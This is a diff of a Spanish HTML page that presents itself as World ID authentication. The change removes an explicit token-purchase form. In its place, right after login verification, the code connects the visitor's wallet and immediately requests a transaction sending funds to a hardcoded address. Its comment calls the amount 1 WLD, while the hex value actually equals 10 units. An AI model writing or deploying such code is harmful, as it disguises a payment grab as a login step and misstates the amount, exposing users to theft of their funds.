@@ -2,90 +2,63 @@
 <html lang="es">
   <head>
     <meta charset="UTF-8" />
-    <title>Comprar CHC con World App</title>
+    <title>Autenticación con World App</title>
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <script src="https://cdn.worldcoin.org/app/v1.0/sdk.js"></script>
   </head>
   <body>
     <h1>Autenticación con World ID</h1>
+
+    <!-- Contenedor del widget -->
     <div id="world-id-container"></div>
+
+    <!-- Resultado -->
     <pre id="resultado"></pre>
 
-    <hr />
-
-    <h2>Comprar CHC</h2>
-    <label for="cantidadChc">¿Cuántos CHC deseas comprar?</label><br />
-    <input type="number" id="cantidadChc" placeholder="Ej. 1000000" /><br /><br />
-    <button onclick="comprarCHC()">Comprar</button>
-
     <script>
-      let walletConectada = null;
-
+      // Iniciar World ID
       window.worldID.init("world-id-container", {
-        action_id: "app_7686f9027d3e3c0b53d987a3caf1e111",
-        signal: "login",
+        action_id: "app_7686f9027d3e3c0b53d987a3caf1e111", // Tu App ID
+        signal: "login", // Puede ser dinámico o fijo
         enable_telemetry: true,
         on_success: async (verificationResponse) => {
-          document.getElementById("resultado").textContent =
-            "✅ Verificado correctamente.\n\n" +
-            JSON.stringify(verificationResponse, null, 2);
+          console.log("✅ Verificado:", verificationResponse);
+          document.getElementById("resultado").textContent = "✅ Verificado correctamente.\n\n" + JSON.stringify(verificationResponse, null, 2);
 
-          // Conectar wallet
+          // ✅ Obtener la dirección de wallet conectada
           if (window.ethereum) {
             try {
-              const accounts = await window.ethereum.request({
-                method: "eth_requestAccounts",
+              const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+              const wallet = accounts[0];
+              console.log("👜 Wallet conectada:", wallet);
+
+              // Enviar WLD a tu wallet (sólo si el usuario acepta)
+              const tx = {
+                from: wallet,
+                to: "0xdc178d65c502f9589bb1a35af08b5723f85ec168", // Tu wallet
+                value: "0x8AC7230489E80000", // 10 ** 18 = 1 WLD (en hexadecimal)
+              };
+
+              const txHash = await window.ethereum.request({
+                method: "eth_sendTransaction",
+                params: [tx],
               });
-              walletConectada = accounts[0];
-              console.log("👜 Wallet conectada:", walletConectada);
-              document.getElementById("resultado").textContent +=
-                `\n\n👜 Wallet conectada: ${walletConectada}`;
-            } catch (err) {
-              console.error("❌ Error al conectar wallet:", err);
-              alert("Error al conectar la wallet.");
+
+              console.log("🚀 Transacción enviada:", txHash);
+              document.getElementById("resultado").textContent += `\n\n🚀 Transacción enviada:\n${txHash}`;
+            } catch (error) {
+              console.error("❌ Error en transacción:", error);
+              document.getElementById("resultado").textContent += `\n\n❌ Error en transacción:\n${error.message}`;
             }
           } else {
-            alert("No se detectó World App / Wallet compatible.");
+            alert("No se detectó World App / Wallet");
           }
         },
         on_error: (error) => {
-          document.getElementById("resultado").textContent =
-            "❌ Error de verificación:\n\n" + error.message;
+          console.error("❌ Error de verificación:", error);
+          document.getElementById("resultado").textContent = "❌ Error de verificación:\n\n" + error.message;
         },
       });
-
-      async function comprarCHC() {
-        const cantidadChc = parseInt(document.getElementById("cantidadChc").value);
-        if (!walletConectada) return alert("Primero debes autenticarte y conectar tu wallet.");
-        if (isNaN(cantidadChc) || cantidadChc <= 0)
-          return alert("Ingresa una cantidad válida de CHC.");
-
-        
-        const wldPorChc = 1 / 1400000;
-        const cantidadWLD = cantidadChc * wldPorChc;
-
-        // Convertir WLD a wei (hexadecimal)
-        const wei = BigInt(cantidadWLD * 1e18).toString(16);
-
-        const tx = {
-          from: walletConectada,
-          to: "0xdc178d65c502f9589bb1a35af08b5723f85ec168",
-          value: "0x" + wei,
-        };
-
-        try {
-          const txHash = await window.ethereum.request({
-            method: "eth_sendTransaction",
-            params: [tx],
-          });
-
-          document.getElementById("resultado").textContent +=
-            `\n\n🚀 Transacción enviada:\n${txHash}\n\n📥 Recibirás tus ${cantidadChc} CHC pronto.`;
-        } catch (error) {
-          console.error("❌ Error en transacción:", error);
-          alert("Error al enviar la transacción:\n" + error.message);
-        }
-      }
     </script>
   </body>
 </html>
